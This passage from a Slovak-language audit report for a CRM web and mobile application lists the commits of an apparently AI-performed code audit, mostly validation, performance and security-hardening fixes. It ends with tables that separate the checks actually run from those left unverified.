| `b817726f` | chore(seo): robots.txt zakazuje aj zvyšné interné SPA cesty |
| `c673ee30` | fix(landing): hero min-height — 100dvh ako prepis 100vh, nie naopak |
| `ffa76b15` | fix(landing): cookie lišta rešpektuje safe-area-inset-bottom |
| `ed88eb5c` | fix(css): fallback bez env() pre nové safe-area deklarácie top/bottom/padding |
| `3e475417` | fix(app): zámok scrollu tela aj pre potvrdzovacie modály opustenia/zmazania prostredia |
| `82cf4315` | fix(css): doplnená chýbajúca animácia `pulse` pre live indikátor v admin paneli |
| `9d686ac5` | chore(klient): odstránený mŕtvy Toast komponent (Toast.jsx + Toast.css) |
| `8fd92b54` | perf(workspaces): projekcia pri načítaní User dokumentov (bez avatarData) |
| `19e175c1` | fix(workspaces): invalidácia workspace cache po zmenách členstva a metadát |
| `09b68813` | fix(workspaces): detekcia "odstraňujem seba" funguje aj pri ObjectId req.user.id |
| `e1d6a99d` | fix(workspaces): DELETE /current maže aj Pages a Notifications workspace-u |
| `e9aaad10` | fix(workspaces): odoslanie e-mailu s pozvánkou čaká max. 15 s, neblokuje odpoveď |
| `3671970d` | fix(workspaces): jednotná PLAN_LIMIT odpoveď pri pozvánkach (403, code, iOS správa) |
| `d0afe55d` | perf(notifications): GET / spúšťa find + dva countDocuments paralelne |
| `cb0060de` | perf(pages): GET /pages vracia len metadáta stránok (bez content), lean + limit |
| `cbafd155` | fix(push): in-memory rate limiter kľúčuje podľa String(userId), nie ObjectId |
| `85a060e2` | fix(notifications): PUT /read-by-section — lookup sekcie cez hasOwnProperty |
| `e3d3eddc` | fix(pages): typová a dĺžková validácia ikony stránky (create aj update) |
| `7daca7be` | fix(push): cleanup setInterval rate limitera s .unref() |
| `6c894235` | fix(workspaces): typové a formátové kontroly vstupov — 400 namiesto TypeError/500 |
| `83da3b9f` | fix(pages): PUT /:id odmietne reparent, ktorý by vytvoril cyklus |
| `291d440f` | fix(push): typové a dĺžkové kontroly tokenov a kľúčov (subscribe, APNs, FCM unregister) |
| `51f6aa76` | fix(workspaces): POST / — fallback slugu pre ne-latinkové názvy, E11000 → 409 |
| `6bdcd35c` | fix(push): POST /fcm/register sanitizuje platform/packageName/appVersion a limituje token |
| `dba9a683` | fix(workspaces): GET /current/members preskočí membership so zmazaným používateľom |
| `045886b2` | fix(push): APNs/FCM status a test endpointy nevracajú interné error.message |
| `69da3c46` | fix(workspaces): validácia ObjectId parametrov (memberId, newOwnerId, invitationId) → 400 |
| `767b1e9a` | perf(workspaces): POST /current/leave — notifikácie adminom paralelne, bez dotazu na User |
| `0efa115e` | fix(workspaces): prevod vlastníctva — poradie zápisov bez stavu "bez vlastníka" |
| `ac530779` | fix(workspaces): súbežné prijatie pozvánky / join cez kód — E11000 ako "už člen", nie 500 |
| `4b76a838` | perf(admin): detail workspace-u nenačítava avatarData členov |
| `20f5a206` | fix(admin): detail používateľa nevracia OAuth tokeny, feed token ani avatar blob |
| `c8ca61c6` | fix(admin): CSV export používateľov a workspace-ov chráni proti formula injection |
| `31b9e35a` | fix(admin): úplná kaskáda pri admin mazaní workspace-u |
| `8fdb0973` | perf(admin): zoznam email logov nenačítava avatarData blob každého riadku |
| `af4f8fd2` | fix(admin): email broadcast odmietne súbežné spustenie (409) a neodpovedá dvakrát |
| `f6fdd13a` | fix(admin): validácia ObjectId v path a body parametroch → 400 namiesto CastError 500 |
| `cdfa0217` | fix(admin): zoznam používateľov kombinuje hasStripe=false a search cez $and |
| `3ae8434e` | perf(admin): CSV exporty bez O(U×M) filtrovania členstiev a s úzkou projekciou |
| `bbe158c7` | fix(admin): PUT /users/bulk validuje userIds (pole, formát ObjectId, limit) a loguje chybu |
| `2f7cff7f` | fix(admin): PUT /users/:userId/subscription validuje plan a paidUntil pred save() |
| `c7be6796` | fix(admin): zľava validuje value ako číslo, expiresAt ako dátum a orezáva reason |
| `cbd34ea0` | fix(admin): chart endpointy obmedzujú ?days na 1..730 |
| `8c94b243` | fix(admin): zmena role/plánu, bulk update a zmazanie používateľa invalidujú auth cache |
| `239a2fd1` | fix(admin): query filtre prijímajú len reťazce/validné ID a dátumy (audit-log, errors, email-logs, commissions) |
| `a94d1075` | fix(admin): vyhľadávanie provízií sa aplikuje pred stránkovaním; paidMethod validovaný proti enumu |
| `ca330705` | fix(admin): email broadcast validuje activeWithinDays a nevracia interný err.message |
| `ccde9da6` | perf(admin): GET /storage zisťuje štatistiky kolekcií paralelne |
| `5561ec92` | fix(admin): GET /errors clampuje limit zdola na 1 |
| `37a7ec4b` | fix(admin): PUT /errors/:id/resolve prijíma notes len ako reťazec |
| `c3be9a08` | fix(admin): CSV export provízií správne obaľuje bunku chránenú proti formula injection |
| `e84c0763` | fix(admin): errors-by-route vracia skutočné hodinové dáta z getMetrics() |
| `f062e206` | style(admin): odstránenie prázdnych riadkov vložených pri audit úpravách |
| `6d9eba6d` | fix(server): CORS_ORIGIN parsovať ako čiarkou oddelený zoznam origin-ov |
| `f579ce3c` | fix(server): 5MB JSON limit pre /api/pages registrovať pred globálnym 1MB parserom |
| `e9f5bbf4` | fix(server): odstrániť mŕtvy verejný express.static mount /uploads |
| `29797554` | perf(workspace): načítavať z User len potrebné polia (projekcia + lean) |
| `aa4e7477` | fix(apiMetrics): obmedziť rast counters.routes pre nespárované cesty |
| `99495ae0` | perf(server): apiLimiter registrovať pred body parsermi |
| `39eadc92` | fix(rateLimiter): loginEmailLimiter.keyGenerator ošetriť nestringový email |
| `62b901df` | fix(server): globálny error handler rešpektuje statusCode, 4xx hlášky a headersSent |
| `90625fbd` | fix(logger): doplniť 'error' listener na winston logger |
| `7ab44a82` | fix(database): listenery na stav Mongo spojenia a pravdivá hláška bez MONGODB_URI |
| `adc2114c` | fix(diagnostics): workspaceId brať z req.workspaceId namiesto neexistujúceho req.user.workspaceId |
| `83ecb6e0` | fix(socket): registrovať listenery hneď pri 'connection', členstvo načítať na pozadí |
| `145c382d` | refactor(workspace): requireWorkspaceAdmin/Owner bez nikdy nevyriešeného Promise wrappera |
| `5f2bfd57` | fix(serverErrorService): atomický $inc pri agregácii chýb a E11000 retry pri súbežnom prvom výskyte |
| `36325d0f` | fix(serverErrorService): scrubovať citlivé polia aj v req.query a req.params |
| `9c0ac33f` | fix(socket): typová a veľkostná kontrola relay payloadov a per-socket limit udalostí |
| `e6911e59` | fix(server): graceful shutdown cez io.close(), aby sa pri otvorených soketoch dokončil |
| `372da56a` | fix(tasks): úprava podúlohy už nemaže prílohy a metadáta (spread subdokumentu) |
| `c2024c02` | fix(tasks): neplatné ID v assignedTo už nezhodí GET /tasks ani PUT (CastError) |
| `f7ef4b09` | fix(tasks): assignedTo sa overuje voči členom workspace – žiadne push notifikácie cudzím používateľom |
| `35b19c29` | perf(tasks): User lookupy len s potrebnými poľami – nenačítava sa avatarData |
| `6d65e491` | perf(tasks): Task.find pre celý workspace bez legacy Base64 dát príloh |
| `f9838d30` | fix(tasks): sedem catch blokov loguje chybu a zapisuje ju do Diagnostiky |
| `b6bad2fb` | fix(tasks): GET /tasks pri 500 už nevracia interné error.message klientovi |
| `e2eea531` | fix(tasks): PUT a DELETE /:id s ObjectId guardom – UUID bez source už nekončí 500 |
| `b32d59f2` | fix(tasks): hodnoty z tela požiadavky sa pred `_id` filtrami typovo overujú |
| `b8685f63` | fix(tasks): typová kontrola title/description/notes/priority – 400 namiesto 500 |
| `e41b2215` | fix(tasks): iCal feed/export prežije neplatný dátum podúlohy (toISOString RangeError) |
| `e8b56a17` | fix(tasks): CSV export formátuje dátumy v Europe/Bratislava, nie v UTC servera |
| `15eee668` | fix(tasks): upload uprace blob v R2/ContactFile, keď sa metadáta nedajú uložiť (404) |
| `cb3a57a7` | perf(tasks): nezávislé dotazy paralelne, populateAssignedUsers raz pred slučkou |
| `63ae748d` | fix(tasks): Content-Disposition pri sťahovaní prílohy podľa RFC 6266 (filename + filename*) |
| `73d4691a` | chore(tasks): diagnostické logy pri PUT a downloade z úrovne info na debug |
| `c2a34442` | fix(kontakty): PUT podúlohy už nestráca prílohy, priradenia a poradie |
| `852f43b8` | fix(kontakty): Content-Disposition sťahovania prílohy podľa RFC 6266 (filename*) |
| `026b76f8` | perf(kontakty): sťahovanie prílohy streamuje z R2 namiesto 50 MB Buffera v RAM |
| `6631bc9d` | fix(súbory): časový strop pre R2 upload/download/delete — visiaci request už neblokuje navždy |
| `281680e5` | fix(prílohy): strop pre in-memory joby ZIP exportu (na používateľa aj globálne) |
| `3443aa3d` | perf(prílohy): ZIP export nenačíta legacy base64 bloby všetkých súborov naraz |
| `2e39d3b4` | fix(prílohy): ZIP export overí, že blob patrí do workspace-u (ako pri sťahovaní jedného súboru) |
| `733377ab` | fix(kontakty): GET /contacts pri 500 nevracia klientovi interný text chyby |
| `733db38c` | fix(kontakty): logovanie chýb v tichých catch blokoch (500 bez stopy) |
| `f9e3b70f` | fix(kontakty): neplatné ObjectId v :id/:contactId vracia 404 namiesto CastError → 500 |
| `e9d85124` | fix(kontakty): validácia typu a dĺžky polí kontaktu + povolené hodnoty stavu |
| `e50be881` | perf(kontakty): plán používateľa sa číta s projekciou subscription, nie celý User dokument |
| `e31f3244` | fix(kontakty): kópia kontaktu do iného prostredia overí vlastníka blobu prílohy |
| `7f6dab5e` | fix(kontakty): DELETE kontaktu maže R2 bloby a ContactFile riadky až po zmazaní dokumentu |
| `7036ab0f` | fix(kontakty): vstupy úloh/podúloh — title ne-reťazec → 400 (nie 500), assignedTo a priority typovo ošetrené |
| `6672038b` | fix(kontakty): customName pri uploade ako pole hodnôt už nepadá na TypeError → 500 |
| `c237809e` | fix(kontakty): upload prílohy po zlyhaní uloženia metadát zmaže osirotený blob |
| `560b9db7` | fix(prílohy): blocklist príloh doplnený o inštalátory a doplnky Windows (msp, mst, xll, appx/msix, gadget, sct, ws) |
| `59118b12` | fix(messages): príjemca odkazu musí byť členom aktuálneho workspace-u |
| `a6897428` | fix(messages): chyba vstupu pri zápise správy → 400, nie 500 + Diagnostika |
| `6e5175c9` | fix(messages): query parametre GET / a /by-linked len ako stringy (operátorová injekcia) |
| `fc989db7` | fix(messages): neplatné ObjectId v :id/:commentId → 400/404 namiesto CastError 500 |
| `05a7b9d8` | perf(messages): approve/reject/reopen/vote nenačítavajú base64 prílohy |
| `6e30f961` | fix(messages): DELETE /:id/files/:fileId maže súbor atomicky cez $pull |
| `6d707390` | fix(messages): DELETE /:id porovnáva odosielateľa cez toString() (403 pre vlastnú správu) |
| `f1a8b673` | fix(messages): možnosť ankety null/číslo → 400, nie TypeError 500 |
| `d97926ed` | fix(messages): textové polia tela sa trimujú len ako stringy (TypeError → 500) |
| `0bf3146c` | fix(messages): linkedId a linkedName s obmedzením dĺžky (128/200 znakov) |
| `64a6c0c3` | fix(messages): notifikácia, socket a audit používajú uložený predmet/dôvod |
| `07ade1be` | fix(messages): catch bloky bez logovania zapisujú skutočnú príčinu 500 |
| `87aacaf1` | fix(messages): reakcia na komentár sa pridá len ak používateľ ešte žiadnu nemá |
| `e0178c19` | fix(google-calendar): webhook nepadá na UUID id kontaktových úloh a nestráca zmeny |
| `19a69340` | fix(google-calendar): reverse sync ukladá dueDate ako reťazec YYYY-MM-DD |
| `0132e7e6` | fix(google-tasks): polling reverse sync ukladá dueDate ako reťazec YYYY-MM-DD |
| `b0924ad9` | fix(google-calendar): /cleanup nemaže podúlohy ani udalosti iných workspace-ov |
| `03b23c69` | fix(google-tasks): /cleanup nemaže podúlohy ani úlohy iných workspace-ov a rešpektuje X-Workspace-Id |
| `e1bd3c25` | fix(google-tasks): /delete-by-search hľadá výraz ako text — ochrana pred ReDoS |
| `ec95ec2a` | perf(google-tasks): /delete-by-search neprechádza všetky zoznamy druhýkrát kvôli počtu |
| `91660104` | perf(google-tasks): polling a auto-sync nenačítavajú avatarData používateľov |
| `f5a30cd0` | perf(google-tasks): GET /status ukladá používateľa len pri resete dennej kvóty |
| `fa5fed1c` | fix(google-tasks): SYNC_TIMEOUT 9 min namiesto 10 — odpoveď stihne prísť pred limitom Renderu |
| `bc1a91ea` | fix(google-tasks): polling hľadá podúlohy len vo workspace-och, kde je používateľ členom |
| `9c867b0a` | fix(google-tasks): polling cyklus sa neprekrýva s predošlým, ktorý ešte beží |
| `187761f4` | perf(google): migrácia na per-workspace kalendáre/zoznamy načíta členstvá raz, nie v cykle |
| `8df08896` | fix(google-calendar): /sync-task nepadá na UUID id kontaktových úloh a neťahá celé kontakty |
| `fc806fe6` | perf(google-calendar): /sync a /cleanup čítajú úlohy cez lean() bez base64 príloh |
| `cd6d92a0` | fix(google-calendar): zámok plného /sync žije 10 min — paralelný sync už nevytvára duplicity |
| `37c40324` | fix(google-calendar): webhook spracúva zmeny jedného používateľa sériovo (per-user zámok) |
| `0c84f092` | perf(google-calendar): auto-sync a obnova watch kanálov nenačítavajú avatarData |
| `7377fe69` | fix(google-calendar): chýbajúci používateľ vracia 404 namiesto TypeError → 500 |
| `73effd68` | perf(google-calendar): /disconnect načíta zoznam kalendárov raz namiesto dvakrát |
| `852ee9e8` | fix(pripomienky): časové pripomienky sa počítajú v Europe/Bratislava, nie v UTC servera |
| `afafb8db` | fix(pripomienky): chyba jednej úlohy alebo kontaktu nezastaví celý plánovač termínov |
| `03ecd021` | fix(pripomienky): kontrola termínov sa nespustí, kým predošlý beh ešte beží |
| `b434dd78` | fix(pripomienky): plánovač termínov sa nedá spustiť dvakrát, časovače majú unref a stop |
| `a9b7e8c7` | fix(pripomienky): pripomienky podúloh dostávajú aj riešitelia samotnej podúlohy |
| `ffc2d40f` | fix(push): FCM nemaže zariadenie pri chybe payloadu (invalid-argument) a orezáva data polia |
| `9ef6df77` | fix(push): zlyhanie zápisu lastUsed sa po doručenom FCM pushi nepočíta ako chyba odoslania |
| `01d847ed` | fix(push): APNs timeout ruší zaseknutý stream a spojenie, timer sa pri odpovedi čistí |
| `e68034c7` | fix(push): textové hodnoty v data payloade web push a APNs sa orezávajú na 300 znakov |
| `f26eaf5a` | fix(push): web push po neopakovateľnej chybe ukončí retry slučku |
| `ff89f824` | fix(push): zlyhanie zápisu lastUsed po doručení už nespôsobí opakované odoslanie notifikácie |
| `5831dd8b` | fix(push): web push má 10 s timeout — zavesený endpoint neblokuje ostatné zariadenia |
| `f5fa0729` | fix(push): Safari na macOS dostáva web push aj keď má používateľ iOS appku |
| `d02aa514` | fix(push): APNs token neplatný v oboch prostrediach (BadDeviceToken) sa zmaže |
| `904aa902` | fix(notifikácie): identifikátory v deep-link URL notifikácií sú URL-encodované |
| `8ccba7e1` | perf(push): createNotification odovzdá už načítané APNs/FCM zariadenia odosielačom |
| `4ac8b068` | perf(notifikácie): orezávanie histórie notifikácií beží len pri ~každom 10. inserte |
| `11ac42c9` | fix(notifikácie): preferencia „Po termíne" (pushOverdue) reálne riadi push pri prekročení termínu |
| `a8f93a8f` | perf(notifikácie): fan-out na viacerých príjemcov beží paralelne, nie sekvenčne |
| `129b3640` | fix(email): mená používateľov a názvy prostredí sa v HTML e-mailoch escapujú |
| `7b816d2f` | fix(email): SMTP transporter má timeouty — zaseknutý SMTP server neblokuje requesty minúty |
| `6de38af4` | fix(affiliate): payoutBankName a payoutNote musia byť reťazce s obmedzenou dĺžkou |
| `f2d2216a` | fix(affiliate): query parameter status v zozname provízií len z povoleného enumu |
| `2ce0c0ea` | fix(kontaktný formulár): meno, e-mail a správa musia byť reťazce — 400 namiesto 500 |
| `de5e4c7f` | fix(oznámenia): dismiss prijme len vlastné ID oznámenia, nie zdedené vlastnosti objektu |
| `4d94e9c1` | chore(email): odhlásenie z e-mailov neloguje e-mailovú adresu používateľa |
| `f222d225` | fix(email): stránka potvrdenia odhlásenia escapuje e-mailovú adresu |
| `37a2b455` | perf(diagnostika): hodinový error alerter filtruje podľa indexovaného createdAt |
| `9306914a` | fix(diagnostika): error alerter si drží handly časovačov, má unref() a stop() |
| `3816cff0` | fix(health): počet používateľov s Google tokenmi už nezahŕňa tých bez tokenu |
| `4ef44dcc` | fix(server): graceful shutdown zastaví periodické joby pred zatvorením DB |
| `a0c9fbe5` | docs: REPORT.md — audit prpl CRM, opravy, nálezy na schválenie a návod na zlúčenie |
| `2306515f` | fix(billing): Stripe klient s 15 s timeoutom a 2 sieťovými retry |
| `51806241` | fix(billing): getOrCreateCustomer atomicky — paralelné checkouty nevytvoria 2 Stripe zákazníkov |
| `dfc34ae5` | fix(billing): Stripe checkout odmietne používateľa s aktívnym Apple IAP predplatným |
| `f63d1f31` | fix(billing-ui): Stripe v tej istej karte, App Store predplatné bez checkoutu, retry pri chybe načítania |
| `20f64f0c` | fix(billing): použitie promo kódu sa započíta až po zaplatení, atomicky a idempotentne |
| `3081bff4` | fix(billing): /verify-session porovnáva userId ako string a mapuje neexistujúcu session na 404 |
| `fbc81a03` | fix(billing): Stripe webhook vracia 500 pri prechodnej chybe, aby Stripe event zopakoval |
| `699e8829` | fix(billing): Stripe webhook handlery zapisujú len zmenené polia, chránia Apple plán a znesú novšie API verzie |
| `16c17741` | fix(affiliate): scheduler provízií neprepíše 'revoked' na 'eligible' a counter počíta len z prepnutých |
| `eb86c81c` | fix(affiliate): čiastočný refund províziu pomerne zníži namiesto úplného zrušenia |
| `56802124` | fix(models): indexy pre Stripe/Google webhooky, dešifrované tokeny sa pri save neprepisujú, toJSON bez tajomstiev |
| `050aada0` | fix(security): rate limity per používateľ, limit na súbory a /join, silnejší kód pozvánky |
| `0f6b950c` | fix(workspaces): zmazanie workspace zmaže aj prílohy kontaktov a projektov (ContactFile + R2) |
| `57c98ad6` | feat(auth): zmena/reset hesla zneplatní všetky JWT relácie (tokenVersion), auth cache bez tajomstiev |
| `6a30a0f0` | fix(auth): validácia vstupov, overenie zmeny e-mailu, mazanie účtu so zrušením predplatného a čistením príloh |
| `6702a3e4` | fix(api): po timeoute/výpadku siete sa automaticky opakujú len idempotentné requesty |
| `b6a42d51` | fix(user-menu): volania cez zdieľané `api`, uloženie nového tokenu po zmene hesla, politika hesla ako server |
| `201f249f` | fix(auth-ui): nový tab počas čakania na token z iného tabu neprejde na /login a nestratí cieľovú URL |
| `b983106f` | refactor(plan-limits): limit členov a PRO_EMAILS na jednom mieste; štartovacie migrácie len raz |
| `ce1b1246` | fix(workspaces): dokúpené miesta (paidSeats) nastaví len super-admin |
| `3e9a9d15` | fix(oauth): väzba OAuth na prehliadač, odložené prepojenie s JWT, auto-link len na overený účet |
| `fbc01d98` | fix(oauth-ui): prihlásenie prijme token len z flow spusteného týmto prehliadačom, prepojenie potvrdí JWT |
| `814e42aa` | fix(connected-accounts): odpojenie s heslom, potvrdenie pripojenia sa zobrazí, väčšie dotykové ciele |
| `64392853` | fix(login): OAuth z pozvánky sa vráti na pozvánku, prepínač bez „#“, odkaz na zásady s lomkou |
| `1a6b33f9` | fix(google): podpísaný OAuth state pre Calendar/Tasks a opätovné pripojenie bez straty nastavení |
| `5fdad60d` | fix(google): 500 odpovede Calendar/Tasks už neposielajú interný text výnimky |
| `2442e5a7` | fix(google-calendar): hromadný /sync synchronizuje len vlastné a nepriradené úlohy |
| `f6f83d79` | fix(google-calendar): /delete-all zmaže aj per-workspace kalendáre a vyčistí všetky sync mapy |
| `557e5397` | fix(google-tasks): Resync / force sync už neduplikuje úlohy v Google Tasks |
| `deebf3a5` | feat(google-sync): dlhý /sync beží na pozadí (202 + polling) namiesto 10-minútového HTTP spojenia |
| `ca294fce` | feat(google-calendar): push kanály aj pre per-workspace kalendáre — zmeny z Google sa dostanú do CRM |
| `cb60997c` | fix(shutdown): stop() aj pre planExpiration, subscription joby, Google Tasks polling a obnovu kalendárových kanálov |
| `193b6514` | test(oauth): auto-link vyžaduje overený e-mail existujúceho účtu |
| `6e72629b` | fix(apple-iap): revokované transakcie neaktivujú plán, unique väzba transakcie, retry notifikácií pre neznámeho usera |
| `d023226e` | fix(subscriptions): auto-expirácia a pripomienky vynechávajú Apple IAP predplatné |
| `3de60cd9` | fix(push): platné web-push odbery sa už nemažú po 30 dňoch bez notifikácie |
| `08389192` | fix(subscription-email): SMTP timeouty, slovenská časová zóna, escapované HTML, podpis bez fallback tajomstva |
| `ef63d5c5` | fix(admin/audit): zmena plánu nemaže Stripe/Apple väzby, bezpečnostné audit záznamy sa ukladajú, admin login bez 500 |
| `425553ca` | fix(admin/promo): promo kód sa v Stripe vytvorí až po všetkých validáciách, bez osirelého couponu |
| `9e6e39b1` | fix(stripe): zdieľaný lazy Stripe klient — server naštartuje aj bez STRIPE_SECRET_KEY |
| `5c1b5502` | fix(admin/affiliate): hromadná výplata provízií len pre reálne 'eligible' a bez prepísania poznámok |
| `a634b167` | fix(admin/affiliate): enroll validuje e-mail, IBAN a dĺžky; externý partner bez falošnej metódy 'password' |
| `902fed6c` | chore(admin): odstránený jednorazový recovery endpoint, migrácia šifrovania tokenov bez N+1 |
| `1319ec59` | perf(admin): počty v detaile používateľa cez existujúce indexy (bez COLLSCAN) |
| `0a558a2e` | fix(plan-limits): limity obsahu workspace sa riadia plánom vlastníka, nie volajúceho člena |
| `5d22d4c1` | fix(tasks): projekt do viacerých kontaktov overí limit pred prvým zápisom (žiadne čiastočné vytvorenie) |
| `7118f153` | fix(plan-limits): duplikovanie projektu a vytvorenie projektu cez kontakt rešpektujú limit projektov |
| `b0ea8e6e` | fix(tasks): zápisové cesty už nenačítavajú kontakt bez legacy príloh — save() ich nezmaže |
| `6fbc02ed` | fix(tasks): zmazanie projektu alebo podúlohy zmaže aj bloby jej príloh (R2 + ContactFile) |
| `e8d66e41` | perf(tasks): stiahnutie prílohy projektu streamuje z R2 namiesto načítania celého súboru do RAM |
| `bb3f05a1` | perf(notifications): notifikácie úloh a podúloh pre viac príjemcov sa vytvárajú paralelne |
| `5cabb3a3` | fix(messages): streamované prílohy, limity uploadu, stránkovanie, index pre prepojené správy, lacnejší výpočet kvóty |
| `23e9472a` | fix(workspaces): notifikácia „člen odišiel“ sa ukladá, pozvánka len pre pozvaný e-mail a atomicky, limit prostredí aj pri súbehu |
| `72e1a7a2` | fix(subtasks): PUT celého stromu podúloh je sanitizovaný (whitelist, typy, hĺbka, serverový stav) a rešpektuje limit |
| `871b52e6` | fix(pages/push): príliš dlhá stránka vráti 413 namiesto tichého orezania; push endpoint bez SSRF na interné hosty |
| `37e610e6` | fix(contact-form): SMTP timeouty, varovanie pri chýbajúcom hesle a konfigurácia cez env |
| `bd823c99` | fix(unsubscribe): GET odkaz z e-mailu už nemení stav — potvrdenie tlačidlom (POST) |
| `e56e9568` | fix(errors): verejný report klientskych chýb má strop nových fingerprintov per IP |
| `fd53cb52` | fix(due-dates): plánovač pripomienok neprepisuje úlohy starým snapshotom a nenačítava celé dokumenty |
| `ebd7d5e7` | perf(push): APNs používa perzistentné HTTP/2 spojenie namiesto nového TLS pre každý push |
| `8005b23c` | perf(db): odstránené redundantné indexy (prefixy compoundov, boolean/enum) + jednorazová migrácia |
| `c79f3435` | feat(security): statický web posiela bezpečnostné hlavičky a CSP (report-only) s reportovaním do Diagnostiky |
| `d947b297` | fix(scripts): žiadne heslá v kóde, deštruktívne skripty predvolene ako dry-run |
| `82374377` | fix(affiliate): affiliate vidí odporučených používateľov len pod maskovaným menom |
| `8711c3e2` | perf(socket): celá aplikácia zdieľa jedno Socket.IO spojenie |
| `6fbc2ca1` | fix(ui): dátumový/časový picker sa neotvára pri scrollovaní prstom cez pole |
| `89ff7e9d` | fix(admin): expirácia promo kódu sa posiela ako absolútny čas, úprava ju neposúva |
| `1839e278` | fix(messages): príloha ku komentáru má tlačidlo 📎, Enter na mobile vkladá nový riadok |
| `7bb64f82` | perf(tasks): karta projektu počíta strom podúloh a triedu termínu raz |
| `7e8dabf3` | chore(client): odstránené mŕtve komponenty z Notion éry (PageView, Block, Sidebar) |
| `e411788d` | fix(files): na iOS sa PDF náhľad nahrádza tlačidlom Stiahnuť (WebKit ukáže len 1. stranu) |
| `eaf6c130` | fix(admin): „Skopírovať pre Claude“ neposiela osobné údaje zákazníkov |
| `6505b425` | fix(auth): reset hesla validuje rovnakú politiku ako server a ruší odložené presmerovanie |
| `f0719e5f` | fix(iap): stránka predplatného v iOS appke ukáže chybu načítania a refresh nezmaže obsah |
| `e661489c` | fix(pwa): nainštalovaná PWA štartuje v appke, prihlásenie ostáva v nej, tablety sa otáčajú |
| `b9f1c39a` | fix(pwa): po deployi sa tab so starým bundlom pri chýbajúcom chunku sám obnoví |
| `dde5f7c4` | chore(git): build artefakty client/dist a client/dev-dist už nie sú v repozitári |
| `24ca9bbe` | chore(crm): odstránených ~700 riadkov nedosiahnuteľného kódu projektov/úloh v CRM.jsx |
| `2cd5573e` | fix(auth): prihlásenie cez prplcrm://auth je viazané na nonce WebView, ktoré flow spustilo |
| `b7d41c63` | fix(iap): StoreKit transakcia sa ukončí až po overení backendom, neukončené sa overia znova |
| `54d3331d` | fix(ios): token len pre prplcrm.eu, po odhlásení sa neobnoví, presný allow-list hostov, prplcrm://auth cez nonce |
| `000f2e88` | fix(ios): ATS bez výnimky pre web obsah, popis prístupu na uloženie fotiek, privacy manifest, logy len v Debug |
| `3841035d` | fix(android): presný allow-list hostov, bridge len pre našu doménu, odhlásenie odregistruje FCM, robustný TokenStore |
| `3a516312` | chore(git): osobný Xcode stav (xcuserdata) už nie je v repozitári |

### 4.3 Bezpečné nálezy, ktoré zostali neopravené

- [INFO] `client/src/pages/AdminPanel.jsx:172` — Promise .then/.catch/.finally reťazce namiesto async/await (viac miest). Dôvod: Čisto štylistický refaktor Promise reťazcov (.then/.catch/.finally) na async/await na 14 miestach — nález sám uvádza „žiadny funkčný dopad“. Odporuje pravidlu najmenšej zmeny správania v živom admin paneli bez testov pre AdminPanel.jsx. Stale/cancel guardy z cli-admin-17 a try/catch z cli-admin-06 boli doplnené priamo do existujúcich reťazcov (resp. async/await len tam, kde sa kód aj tak prepisov… Navrhovaná oprava: Každé miesto prepísať so zachovaním fallbackov (null/[]/no-op catch), napr. r. 172-179: `useEffect(() => { const run = async () => { try { const [s, h] = await Promise.all([adminApi.get('/api/admin/stats').then(r => r.data).catch(() => null), adminApi.get('/api/admin/health').then(r => r.data).catc…

## 5. Overenie a čo je neoverené

**Druhá vlna — čo som reálne spustil po posledných zmenách (HEAD vetvy):**

| Kontrola | Výsledok |
|---|---|
| `client`: `npx vitest run` | 12 súborov, **111/111** testov prešlo (99 pôvodných + nové: `useSocket`, `iapBridge`, `AuthContext.nativeLogin`) |
| `client`: `npm run build` (vite + prerender) | prešiel, PWA precache 61 položiek, prerender landingu OK; `client/dist` už nie je v gite |
| `server`: `node --check` všetkých sledovaných `.js` súborov | bez chýb |
| `server`: `require` všetkých modulov v routes/services/utils/middleware/models/jobs/config | 0 zlyhaní |
| `server`: Jest bez MongoDB (prázdny setup) | 7 suít / 75 testov, ktoré DB nepotrebujú, **prešlo** (vrátane nových `nestedTaskUpdate`, `dueDateCheckerFlow`, `subtaskFiles`); 40 suít potrebuje MongoDB (`User.init()` / DB hook vyprší) → **neoverené** |
| APNs HTTP/2 znovupoužitie spojenia | overené proti lokálnemu HTTP/2 serveru: 3 pushe = 1 spojenie, 400 → `BadDeviceToken`, timeout → nové spojenie |
| CSP report endpoint | overené lokálne: `application/csp-report` aj `reports+json` → 204 a záznam `CSPViolation`, nevalidné telo → 400 |
| Strop nových fingerprintov klientskych chýb | overené: po limite sa ďalšie nové druhy z tej istej IP zahodia, iná IP prejde |
| Babel scope analýza pri mazaní mŕtveho kódu v `CRM.jsx` | žiadna nová nerozlíšená referencia (globály pred = po) |
| `Info.plist`, `PrivacyInfo.xcprivacy` | validné plisty (plistlib) |

**NEOVERENÉ (druhá vlna):**

- **Swift (iOS) a Kotlin (Android) zmeny neboli kompilované** — v prostredí nie je Xcode ani Android SDK. Diffy som prečítal riadok po riadku (syntax, zátvorky, interpolácie, signatúry API), ale build a test na zariadení sú nutné pred vydaním (kapitola 7 D).
- **Serverové testy proti MongoDB** (40 suít, vrátane tých, ktoré som upravil: auth, oauth, billing, workspaces, googleCalendar/Tasks, messages, push, pages…) — `mongodb-memory-server` nevie stiahnuť binárku (sieťová politika). Spustite `cd server && npm test` lokálne.
- Správanie Render static site hlavičiek z `render.yaml` (Blueprint sync, poradie pravidiel) a `_redirects` — render.com je z prostredia blokovaný.
- Build nových indexov na produkčnej DB (najmä unique `uniq_apple_original_tx` pri prípadných duplicitách) a migrácia `drop_redundant_indexes_v1`.
- Stripe/Apple/Google/FCM/APNs integrácie proti reálnym službám (webhooky, IAP sandbox, OAuth v Safari/Chrome).

---

**Prvá vlna (pôvodné kontroly, commity do `a0c9fbe`):**

**Čo som reálne spustil a s akým výsledkom (stav vetvy `claude/audit-fixes`):**

| Kontrola | Výsledok |
|---|---|
| `client`: `npx vitest run` (pred zmenami aj po nich) | 9 súborov, 99/99 testov prešlo |
| `client`: `npm run build` (vite build + prerender) | prešiel, PWA precache 61 položiek, prerender landingu OK |
| `server`: `node --check` všetkých 31 zmenených súborov | bez chýb |
| `server`: načítanie (`require`) všetkých zmenených modulov | bez chýb (admin.js potrebuje `STRIPE_SECRET_KEY` aj v pôvodnom kóde) |
| `server`: dymový test `node index.js` bez databázy | `/health` a `/api/version` odpovedajú, `/api/*` vracia 503 (DB sa spúšťa), nevalidný JSON → 400, `/uploads` → 404, CORS so zoznamom originov pustí len povolený origin |
| `server`: Socket.IO bez tokenu / s podvrhnutým tokenom | odmietnuté („Authentication required" / „Invalid token") |
| `server`: SIGTERM | graceful shutdown dobehne hneď s exit 0 (predtým čakal na 10 s timeout pri otvorených soketoch) |
| Prepočet časových pripomienok (Europe/Bratislava) | overený výpočtom pre leto, zimu a oba dni zmeny času |
| Lint | v projekte nie je žiadny lint skript ani nástroj (eslint/prettier nie sú v `node_modules`) — nespustené |

